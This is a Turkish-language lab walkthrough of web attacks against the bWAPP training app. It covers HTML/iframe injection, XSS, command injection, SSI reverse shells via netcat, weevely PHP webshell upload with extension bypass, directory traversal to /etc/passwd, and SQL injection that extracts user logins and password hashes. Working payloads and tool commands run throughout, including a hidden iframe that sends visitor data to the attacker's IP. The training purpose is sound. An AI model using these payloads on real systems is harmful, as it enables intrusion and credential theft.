HTML  ENJEKSİYON AÇIKLARI

html injection - reflected (GET):

![photo_6023604428080265317](https://user-images.githubusercontent.com/110966683/183882924-70f82c7d-2eda-466c-9db7-4680c145040d.jpeg)

bu panelde html açığı olup olmadığını anlamak için panele html kodu yazıyoruz ben örnek olarak başlık satırı içinde adımı  yazıyorum.

![photo_6025856227893950465_w](https://user-images.githubusercontent.com/110966683/183883997-b8cb1b5b-2198-4612-ac88-f445d160f5e6.jpeg)

gördüğümüz gibi başlık olarak yazdı 

alert scripti deneyelim şimdi ekrana 1 yazdırması lazım

<h1>Hello,<script>alert(1)</script>!</h1>

![photo_6023604428080265318_w](https://user-images.githubusercontent.com/110966683/183884371-f0fefa5a-4830-465d-8f45-8b239cb8ccf7.jpg)

html injection - stored (BLOG):

eğer bir stored açığı olursa burda çalıştırdığımız bir kod web sitesine giren herkesi etkiler farklı bilgisayrdan bu web sitesine girseniz bile hackerin çalıştırdığı kod çalışacaktır.
örnek olarak alert scripti çalıştırırsak giren her kullanıcı bu alerti görür
alert scripti: <h1>Hello,<script>alert(1)</script>!</h1>
peki daha teklikeli olarak ne yapılabilir;
<iframe src="http://192.168.245.148:4545/test" height="0"  width="0"></iframe>
kendi bilgisayarımızın ip sini ve kullanılmayan bir port adresi yazıyoruz 

bu komut sayesinde siteye giren kullanıcıların bilgileri bilgisayarımıza gelir
dinlemek için linux terminalimizde natcat kullanacağız 
linux natcat komutu: nc -nvlp 4545 dinlemek için 


![photo_6023604428080265325_w](https://user-images.githubusercontent.com/110966683/183884730-c7d1a93e-aefe-488d-938b-738bfcd1d907.jpg)


görüldüğü gibi belirlediğimiz portu dinledi ve kullanıcının bilgilerini getirdi.


İFRAME ENJECTİON


iframe enjeksiyonunda brupsuiti açıp proxy kısmından intercepti açıyoruz bu sayede tüm paketler yollanmadan buraya geliyor burda gelen paketi değiştirip forward  ediyoruz ve bizim yaptığımız değişikle site açılıyor 


![photo_6025856227893950471_w](https://user-images.githubusercontent.com/110966683/183889548-d56fb3e7-74a5-48ff-b77d-1a23062e705c.jpg)

gelen paket bu şekilde 

![photo_6025856227893950472_w](https://user-images.githubusercontent.com/110966683/183889597-765c5d39-cf45-40dc-ac85-7108d3520731.jpg)

görülen html kodunu yazıp forward ediyoruz 


![photo_6025856227893950474_w](https://user-images.githubusercontent.com/110966683/183889800-b5779563-0cdb-4db4-ab5e-396398df50a4.jpg)

görüldüğü gibi yazdığımız kod çalıştı.

PHP ENJEKSİYON AÇIKLARI 

php injection:

php urlsinde komut çalıştırmayı deniyoruz 
normalde iki komut çalıştırmek için komutların arasına ; konur şimdi bunu deneyeceğiz
; koyup system("whoamı") çalıştırıyoruz yani sistem içinde ben kimim komutu çalıştırıyoruz 

php upload açıkları:
weevely
weevely aracı bizim için php payloadı oluşturuyor.
komut = weevely generate 123456 myweevely.php
weevely generate yazıp şifre sonrada isim yazıp payload oluşturuyoruz bunu resim update etme yerinden update etmeyi deneyeceğiz ve upload olunca weevely aracımıza gelip 
weevely yazıyoruz sonra update ettiğimiz url yi ve son olarak şifreyi yazıp giriyoruz 

![photo_6025856227893950494_w](https://user-images.githubusercontent.com/110966683/183912608-ed9b34b1-5c7d-44b5-9e28-b0ecf7d5f834.jpg)


gördüğünüz gibi sistemi hackledik.

varsayalım ki php yüklemeye çalıştığınız sistem .php uzantısını engellemiş o zaman linux terminalimize gelip cp myweevely.php myweevely.php3 (3 olmak zorunda değil siz başka rakamda deneyebilirsiniz.)şeklinde deneyebilirsiniz yani php dosyamızın adını php3 olarak değiştirdik sadece ama uzantı olarak hala php alternatif olarak denenebilir. 



KOD ÇALIŞTIRMA AÇIKLARI

dns lookup da google.com yazınca server ip adres, falan çıktığını görüyoruz demekki burda bir komut çalışıyor ve bu bilgiler bize geliyor.

![photo_6025856227893950502_w](https://user-images.githubusercontent.com/110966683/183921757-a1247bc9-64c7-4e48-9fd9-a473487bafcd.jpg)



 şimdi biz burda kendi komutlarımızı çalıştırmayıdeneyeceğiz.
 öncelikle her zamanki gibi yazdığımız şeyden sonra ; koyup komut çalıştırıyoruz 


![photo_6025856227893950501_w](https://user-images.githubusercontent.com/110966683/183921778-f63217ea-c0f4-4dee-a8d0-283ff1959517.jpg)



gördüğünüz gibi ls komutu çalıştı demekki burda kod çalıştırma açığı var.
ekstra olarak site ; işaretini engellemiş olabilir biz kali terminalimizde 2 komut çalıştırmak istediğimizde && (ve) işaretini koyarsak yazılan 2 komutu da çalıştır anlamına gelir ya da | (alt ve tire tuşlarıyla yapabilirsiniz) işaretiye ilk komutu çalıştır ilk komutun cevabını al 2. komutta kullan anlamına gelen bu işareti kullanırız o yüzden ; olmazsa tek tek diğer işaretleride deneyebilirsiniz.


bunun için linux ta hazır bir tool var onu inceleyelim
commix
nasıl çalıştığını anlamak için öncelikle commix --help yazıp dökümanına bakabilirsiniz 
ama daha öncesinde burp suiti açmamız gerek burp suiti açıp target kısmından  bWAPP klasörüne gelip  post metodunu açıyoruz burda bizim sitemiz hakkında bilgiler yazıyor

![photo_6025856227893950508_w](https://user-images.githubusercontent.com/110966683/183929265-e9f02c35-f80e-4215-909d-61705a5ce74f.jpg)


şimdi bu bilgileri kullanarak commix toolumuzu çalıştıracağız 


commix --url="http://192.168.1.74/bWAPP/commandi.php" --cookie="PHPSESSID=384fe54d2b5eb725e8f877f27ec54b5f; security_level=0" --data="target=www.google.com%3Bls&form=submit"


![photo_6025856227893950514_w](https://user-images.githubusercontent.com/110966683/183929316-a19799a3-b7fe-4ad2-9e35-54ee536c9e67.jpg)



gördüğünüz gibi ben burda gerekli bilgileri yazıp çalıştırdan sonra commix bizim için hemen bir shell açtı ve siteye bağlandı "?" kullanarak neler yapabileceğinizi görebilirsiniz.


SSI SERVER SİDE İNCLUDE AÇIKLARI


bir sunucuda çalışan programlama dili (scriptİ) diyebiliriz 



eğerki bir web sitesinde .shtml görüyarsanız o web sitesinde ssı vardır.


![photo_6028108027707636191_w](https://user-images.githubusercontent.com/110966683/184119990-382deefc-701e-45d5-8228-08cf6d096674.jpg)


gördüğünüz gibi sitemizde .shtml var


![photo_6028108027707636192_w](https://user-images.githubusercontent.com/110966683/184120309-9e3e7c24-d736-4e56-af81-9c631df301ee.jpg)

şimdi ssı kodlarına bakıp örnek bir komut çalıştıralım.

![photo_6028108027707636193_w](https://user-images.githubusercontent.com/110966683/184120623-a6ea8b79-bc9e-4e8d-86ce-549ce699580f.jpg)


gördüğünüz gibi ls komutu çalıştı demekki ssı açığı var.

şimdi nc komutu çalıştırıp sistemi hacklemeyi deneyelim

kali terminalimizden nc -nvlp 1234 komutunu çalıştırıp 1234 portunu dinlemeye başlıyoruz

![photo_6028108027707636195_w](https://user-images.githubusercontent.com/110966683/184121007-70face33-0498-4739-a55c-83ab576260b7.jpg)


ve gördüğünüz gibi bağlantı geldi yazdığımız komutlarla sistemi hacklediğimizi görüyoruz.

DİRECTORY TRAVERSEL AÇIKLARI 

erişim sağlanan yerlerde bug var yani erişimimiz olmayan dosyaları görebilme açıkları 

directory traversel - files:

![photo_6028108027707636196_w](https://user-images.githubusercontent.com/110966683/184121451-864aef7b-b6d9-4b7b-8de9-92906c7603a2.jpg)


kali terminalimizde geri gitmek için nasıl cd .. komutunu kullanıyorsak burda da onu deneyeceğiz message.txt yazan yeri silip bi kaç dosya geri gelelim ve bakalım /etc/passwd 
klasörünü görebilecekmiyiz deneyelim.

![photo_6028108027707636207_w](https://user-images.githubusercontent.com/110966683/184125098-b858c0c8-71dc-425f-b9a0-5b88c6a774ae.jpg)


evet gördüğünüz gibi 4 dosya geri gelip /etc/passwd yazınca dosya bilgilerini görüyoruz 

bunun için linux ta hazır bir tool var inceleyelim 

dotdotpwn 

eğer sizde yüklü değilse apt-get install dotdotpwn  yazarak yükleyebilirsiniz 
komutu çalıştırmak için dotdotpwn -m http -h 192.168.245.159/bWAPP/directory_traversal_1.php?page=message.txt (bwapp urlsini http olmadan yapıştırıyoruz)

![photo_6028108027707636198_w](https://user-images.githubusercontent.com/110966683/184122721-f567d9b2-d7e3-4b6a-aa09-a197c254ef52.jpg)

yazdık çalıştıralım 

![photo_6028108027707636199_w](https://user-images.githubusercontent.com/110966683/184122901-5442150a-fe18-451c-9017-d51ef7bac040.jpg)


gördüğünüz gibi sonuçlar geldi sonuçları incelersek manuel yaptığımız işlemleri tek tek deniyor hatta  "/" işaretinin filtrelenmiş olabilieceğini hesaplayıp mesela %5 yazmış html kodlarına bakarsanız "/" işaretinin "%5" e denk geldiğini görürsünüz


![photo_6028108027707636200_w](https://user-images.githubusercontent.com/110966683/184123286-100724b8-6fa4-45f9-b480-b55d4692fe46.jpg)


aşşağı indikçe bu şekilde çok örnek görebilirsiniz default olarak 6 ayarlandığı için her şey 6 defa denenmiş

XSS AÇIKLARI 

web pentesting yaparken karşımıza en fazla çıkan açık türüdür.

xss reflected get:
siteye normal kullanıcı adı şifremizi yazınca url de gözüğtüğünü görüyoruz

![photo_6028108027707636201_w](https://user-images.githubusercontent.com/110966683/184123614-576c16b3-1246-4693-bceb-3c95343f9e8e.jpg)


şimdi java script kodu çalıştırabiliyormuyuz deneyelim java script bilmiyorsanız  googleye xss payloads yazıp çıkan siteden aldığınız kodları deneyebilirsiniz örnek olarak alert kodu çalıştırıyoruz 
 <script>alert(123);</script>


![photo_6028108027707636202_w](https://user-images.githubusercontent.com/110966683/184123947-8a379ae0-6f8a-4e90-941e-5574cad0ca9a.jpg)


gördüğünüz gibi kodumuz çalıştI ve ekrana alert verdi

reflected ajax xss açıkları:

![photo_6028108027707636229_w](https://user-images.githubusercontent.com/110966683/184140233-34a88298-1f66-4e8b-93e9-5e79adfa33b3.jpg)

öncelikle burp suitimizi açıp ne istekler yaptığını görelim.

![photo_6028108027707636230_w](https://user-images.githubusercontent.com/110966683/184140288-a34e6958-39ca-451d-acac-46bcef56a628.jpg)


isteklerin geldiğini görüyoruz 

şimdi xss açığı varmı diye javascript kodları çalıştıralım 
örnek olarak
 <script>alert("xss");</script> 
 
 ![photo_6028108027707636232_w](https://user-images.githubusercontent.com/110966683/184140531-7964ee5d-500f-4333-bf2b-dd8e6a06b2bf.jpg)

 
gördüüğünüz gibi çalışmadı demek ki bu sitede bir blok var script komutu çalışmıyor

şimdi onerror komutunu deneyelim


![photo_6028108027707636236_w](https://user-images.githubusercontent.com/110966683/184141902-240dc46a-0c4e-46e6-90dc-0de2823803f8.jpg)


Onerror komutu yükleyemezsem ne yapayım diye soruyor ve alert yazdığımız içinde gördüğünüz gibi ekrana uyarı mesajını verdi bu komut kullanılan bir kalıptır sizde xss testlerinizde bu komutu kullanabilirsiniz.

xss-stored(blog):
stored açığı bulursanız eğer uyguladığınız script siteye giren herkese uygulanır bu nedenle az bulunan bir açıktır.
şimdi verilen panelde script kodu çalıştırmayı deniyoruz 


![photo_6028108027707636233_w](https://user-images.githubusercontent.com/110966683/184142320-c9149e5b-36b4-461e-bb10-fb476bdf6ccd.jpg)

çalıştıralım şimdi 


![photo_6028108027707636234_w](https://user-images.githubusercontent.com/110966683/184142468-8e9cb42f-6ff2-4aab-906f-494ebd769bc3.jpg)


gördüğünüz gibi çalıştı bu siteye giren herkes artık bu uyarı mesajını görecek.


SQL ENJEKSİYON AÇIKLARI 

SQL ENJEKSİYON
SQL enjeksiyon’u, SQL kodlarının hedef sisteme enjekte edilmesinin ardından sistemin veritabanından istenilen bilgilerin elde edilmesi olarak tanımlayabiliriz.

ilk olarak sql enjeksiyonun olup olmadığını anlamak için ilk adım olarak kullanıcı adı 
ya da şifre yerine tek tırnak işareti koyalım.Bazı sitelerde tek tırnak koyduktan sonra detaylı bir hata mesajı alabilirsiniz.

![photo_6030673690846410787_w](https://user-images.githubusercontent.com/110966683/184313349-77c27e86-0420-4c90-92d8-df54c9b16448.jpg)


gördüğünüz gibi burda şifre yerine ' tek tırnak işareti koydum ve gelen hata mesajında bir bozukluk olduğunu farkettim şimdi burd SQL kodları deneyelim bakalım oluyor mu

0' or '0' = '0

 şifre 0 ise login ol ya da 0=0 yani sıfır sıfıra eşitse login ol yani her iki seçenekten sadece biri bile doğruysa 1 kabul et buda login olmamızı sağlar hem şifre hem kullanıcı adı kısmına aynı şeyi yazıp enter diyoruz 

![photo_6030673690846410787_w](https://user-images.githubusercontent.com/110966683/184313457-4f1fcfce-ad5c-46a0-bce4-c7b060e789c0.jpg)


ve gördüğünüz gibi sisteme giris yapmayı başardık.

SQL ınjection (POST/search)
arattığımız filmleri bulan bir panel şimdi bu panelde ' koyarak gelen hata mesajına bakalım.

![photo_6030673690846410859_w](https://user-images.githubusercontent.com/110966683/184357482-c190cc26-4893-4473-b7a5-f13032dcb1f5.jpg)


gördüğünüz gibi hata mesajında bir sorun var demekki burda sql kodları deneyebiliriz 

ilk olarak  'or 1=1#   yazıyoruz 


![photo_6030673690846410839_w](https://user-images.githubusercontent.com/110966683/184357765-e425b8df-791d-4805-ba29-b93ec4e34981.jpg)


gördüğünüz gibi sitedeki tüm filmler çıktı karşımıza 

şimdi union select kullanalım 
ben öncesinde 
order by 5#
order by 8#
order by 7#
denedim ve 7 table olduğunu antespit ettim
şimdi onları görüntüleyelim
UNION SELECT = her şeyi seç ve  o tabledeki tüm kullanıcıları gösterir
'or 1=1 union select 1,2,3,4,5,6,7#


![photo_6030673690846410840_w](https://user-images.githubusercontent.com/110966683/184357956-c9e561e4-b4b1-4e8e-b61b-b50543d30350.jpg)


gördüğünüz gibi tüm filmler çıktı .


'and 1=0 union select 1,2,3,4,5,6,7#

şimdi bu komutu çalıştırarak veri isteyebileceğimiz tableleri görelim 


![photo_6030673690846410842_w](https://user-images.githubusercontent.com/110966683/184358185-82769306-9d92-4629-9673-c9bfc76b93a8.jpg)


2, 3, 4, 5 ten veri isteyebilirmişiz 
şimdi table isimlerini görelim 

'and 1=0 union select 1,table_name,3,4,5,6,7 from information_schema.tables#

bu komutu yazarak table isimlerini ve şemaları görebiliriz.


![photo_6030673690846410844_w](https://user-images.githubusercontent.com/110966683/184359935-e9130310-c30e-4608-bd34-c5a50acaaea1.jpg)


gördüğünüz gibi bilgiler geldi

şimdide kullanıcının erişimi olan table leri gösterelim

'and 1=0 union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='users' #



![photo_6030673690846410846_w](https://user-images.githubusercontent.com/110966683/184358556-dd08b1d3-bed2-4caf-bf34-32ddc9127c3b.jpg)


gördüğünüz gibi bilgiler geldi

son olarak 
' and 1=0 union select 1,id,login,4,password,6,7 from users#

bu komutu çalıştıralım ve id login ve password bilgilerini alalım



![photo_6030673690846410847_w](https://user-images.githubusercontent.com/110966683/184358930-2c9c1488-58d5-4013-adf8-3bdf8f9d5634.jpg)



gördüğünüz gibi login olan bee ve A.I.M kullanıcıların adı ve şifresi hashli şekilde  geldi ekrana.








